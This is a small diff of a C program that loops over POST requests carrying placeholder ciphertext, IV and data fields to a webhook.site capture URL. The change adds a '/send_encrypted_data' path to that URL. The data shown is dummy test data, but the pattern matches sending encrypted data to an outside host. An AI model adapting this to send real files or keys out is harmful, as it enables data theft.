@@ -283,7 +283,7 @@ int main() {
         sprintf(post_data, "{ \"ciphertext\": \"test123\", \"iv\": \"wudhiw\", \"data\": \"efefefefef\" }");
         printf("Post Data: \n%s\n", post_data);
 
-        snprintf(buffer, BUFFER_SIZE, "%s", "https://webhook.site/e4befafa-3abc-4a81-b567-1422fa0ebe74");
+        snprintf(buffer, BUFFER_SIZE, "%s%s", "https://webhook.site/e4befafa-3abc-4a81-b567-1422fa0ebe74", "/send_encrypted_data");
         send_post_request(buffer, post_data, &response);
         fprintf(log_file, "Server response (iteration %d): %s\n", i + 1, response.memory);
         printf("Server response (iteration %d): %s\n", i + 1, response.memory);
